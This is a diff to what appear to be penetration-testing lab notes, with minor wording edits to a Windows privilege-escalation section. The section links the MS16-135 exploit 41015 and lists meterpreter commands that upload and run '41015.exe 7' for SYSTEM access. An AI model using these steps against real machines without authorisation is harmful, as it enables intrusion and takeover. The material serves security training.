@@ -240,7 +240,7 @@ pip install xlrd --upgrade
   - check the [41015.c](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/41015.c) `C` file to check if the code does what it's supposed to
   - in this case I will use the pre-build executable `41015.exe`
 
-- Knowing that the specific Windows version is vulnerable to this particulare exploit, proceed with the exploitation
+- Knowing that the specific Windows version is vulnerable to this particular exploit, proceed with the exploitation
 
 Use the `meterpreter` access to upload the `41015.exe` file to the `temp` directory within the Windows O.S.
 
@@ -253,15 +253,13 @@ cd temp\\
 upload 41015.exe
 shell
 .\41015.exe 7
-
-41015.exe Privilege Escalation
 ```
 
 ![41015.exe Privilege Escalation](.gitbook/assets/image-20230315173113966.png)
 
 
 
-- Antivirus will detect the Exploit file, pay attention.
+> 🧪 I have tried to copy the exploit file to my protected Windows host. Antivirus will detect the Exploit file, pay attention.
 
 ![](.gitbook/assets/image-20230315173432723.png)
 
